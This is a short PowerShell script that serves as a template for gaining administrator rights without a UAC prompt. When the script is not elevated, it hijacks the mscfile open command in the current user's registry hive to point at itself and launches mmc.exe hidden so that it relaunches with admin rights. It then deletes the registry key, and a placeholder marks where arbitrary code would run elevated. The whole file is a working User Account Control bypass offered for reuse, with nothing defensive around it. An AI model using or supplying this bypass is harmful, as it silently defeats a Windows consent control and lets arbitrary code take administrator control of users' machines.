function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using MMC (mscfile) bypass..." -ForegroundColor Yellow
    
    $regPath = "HKCU:\Software\Classes\mscfile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "$PSCommandPath" -Force
    
    Start-Process "C:\Windows\System32\mmc.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
